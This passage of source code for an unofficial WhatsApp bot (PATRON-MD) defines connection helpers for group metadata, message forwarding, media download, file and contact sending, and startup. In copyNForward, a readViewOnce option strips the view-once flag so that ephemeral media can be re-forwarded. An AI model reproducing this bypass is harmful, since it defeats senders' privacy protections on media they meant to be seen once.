        metadataRequests.set(jid, []);
    }
    
    const requests = metadataRequests.get(jid);
    // Remove old requests
    while (requests.length > 0 && requests[0] < now - RATE_LIMIT.windowMs) {
        requests.shift();
    }
    
    // Check rate limit
    if (requests.length >= RATE_LIMIT.maxRequests) {
        const oldestRequest = requests[0];
        const waitTime = RATE_LIMIT.windowMs - (now - oldestRequest);
        if (waitTime > 0) {
            await new Promise(resolve => setTimeout(resolve, waitTime));
        }
    }
    
    try {
        requests.push(now);
        const metadata = await conn.groupMetadata(jid);
        groupMetadataCache.set(jid, {
            timestamp: now,
            data: metadata
        });
        return metadata;
    } catch (error) {
        if (error?.data === 429) {
            // On rate limit, wait 2 seconds and retry once
            await new Promise(resolve => setTimeout(resolve, 2000));
            try {
                const metadata = await conn.groupMetadata(jid);
                groupMetadataCache.set(jid, {
                    timestamp: now,
                    data: metadata
                });
                return metadata;
            } catch (retryError) {
                console.error('[Rate Limit] Retry failed:', retryError?.message || retryError);
                return groupMetadataCache.get(jid)?.data;
            }
        }
        throw error;
    }
}

    //===================================================   
    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        const decoded = jidDecode(jid);
        if (decoded && decoded.user && decoded.server) {
          return decoded.user + '@' + decoded.server;
        } else {
          // Handle undefined or invalid decode
          console.error('Invalid JID for jidDecode:', jid);
          return jid;
        }
      } else return jid;
    };
    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
              }
          } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
          // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
    
      return buffer
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} message
    * @param {*} forceForward
    * @param {*} options
    * @returns
    */
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res
                  if (options && options.asDocument) {
                    res = await axios.get(url, { responseType: 'arraybuffer' });
                  } else {
                    res = await axios.head(url)
                  }
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted, ...options })
                  }
                  let type = mime.split("/")[0] + "Message"
                  if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted, ...options })
                  }
                  if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted, ...options })
                  }
                  if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted, ...options })
                  }
                  if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted, ...options })
                  }
                }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      //let copy = message.toJSON()
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
          ...content,
          ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
    
      return proto.WebMessageInfo.fromObject(copy)
    }
    
    
    /**
    *
    * @param {*} path
    * @returns
    */
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
      let type = await FileType.fromBuffer(data) || {
          mime: 'application/octet-stream',
          ext: '.bin'
      }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
          res,
          filename,
          size: await getSizeMedia(data),
          ...type,
          data
      }
    
    }
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} buttons
     * @param {*} caption
     * @param {*} footer
     * @param {*} quoted
     * @param {*} options
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
          //========================================================================================================================================
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
    // Attach Squid Game listener after connection
    attachSquidGameListener(conn);
}

// Graceful shutdown for PM2 and other process managers
process.on('SIGINT', async () => {
  if (conn && conn.ws && conn.ws.close) {
    try { conn.ws.close(); } catch (e) { console.error('Error closing ws:', e); }
  }
  process.exit(0);
});
process.on('SIGTERM', async () => {
  if (conn && conn.ws && conn.ws.close) {
    try { conn.ws.close(); } catch (e) { console.error('Error closing ws:', e); }
  }
  process.exit(0);
});

const express = require('express');
const app = express();

// Add a basic route
app.get('/', (req, res) => {
    res.send('PATRON-MD STARTED ✅');
});

// Start the server
const port = process.env.PORT || 3000;
app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

// Ensure session is downloaded before connecting to WhatsApp
(async () => {
  await downloadSessionData();
  setTimeout(() => {
    connectToWA();
  }, 4000);
})();
